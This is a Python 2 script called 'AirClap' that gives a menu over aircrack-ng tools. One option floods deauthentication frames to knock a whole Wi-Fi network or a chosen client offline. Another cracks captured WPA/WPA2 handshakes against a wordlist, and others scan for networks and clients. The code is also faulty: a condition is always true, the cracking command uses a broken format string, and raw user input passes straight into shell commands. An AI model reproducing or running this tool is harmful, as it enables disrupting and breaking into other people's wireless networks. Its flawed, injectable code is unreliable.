import os
os.system("git pull")
print ("if you want to exit the program just press CTRL and c to stop")
print ("when running airodump-ng just press ctrl c to stop")
print ("----------------------------------------------------------------")
print ("AirClap, Created by Josiah Crofton, All Rights Reserved!")
print ("Scan For Networks /a")
print ("Start Monitor Mode /b")
print ("Kick Someone off Their Wifi /c")
print ("Crack a wpa2, wpa wifi password /d")
print ("Scan for clients /e")
print ("-------------------------------------------")
main_choice = raw_input("I choose:")
if main_choice == 'a':
  os.system("airodump-ng wlan0mon")
  print ("Make sure you copy the bssid of the network you want to target!")
  print ("And make sure to remeber the channel")
if main_choice == 'b':
  os.system("airmon-ng start wlan0")
if main_choice == 'c':
  lack = raw_input("Would you like to take down a network or just a target n/T:")
if lack == 'n' or 'N':
  os.system("airodump-ng wlan0mon")
  t = raw_input("Enter the bssid of your target!:")
  a = raw_input("Enter the channel of of your target:")
  os.system("airodump-ng --channel %s --bssid %s wlan0mon" % (a, t))
  os.system("aireplay-ng -0 0 -a %s wlan0mon" % t)
else:
  p = raw_input("Enter the bssid of your target!:")
  aireplay_client = raw_input("Enter the client you want to target:")
  os.system("aireplay-ng -0 0 -a %s -c %s wlan0mon" % (p, aireplay_client))
if main_choice == 'd':
  path = raw_input("Enter the path your pcap file:")
  b = raw_input("Enter the bssid of the network your trying to crack:")
  wordlist = raw_input("Enter the path for the wordlist:")
  os.system("aircrack-ng -w $s -b $s $s" % (wordlist, b, path))
if main_choice == 'e':
  r = raw_input("Enter the bssid of the network your targeting")
  e = raw_input("Enter the channel of the network your targeting")
  os.system("airodump-ng --channel %s --bssid %s wlan0mon" % (e, r))
menu_loop = raw_input("Would you like to return to main menu? y/n:")
if menu_loop == 'y':
  print ("working on it")
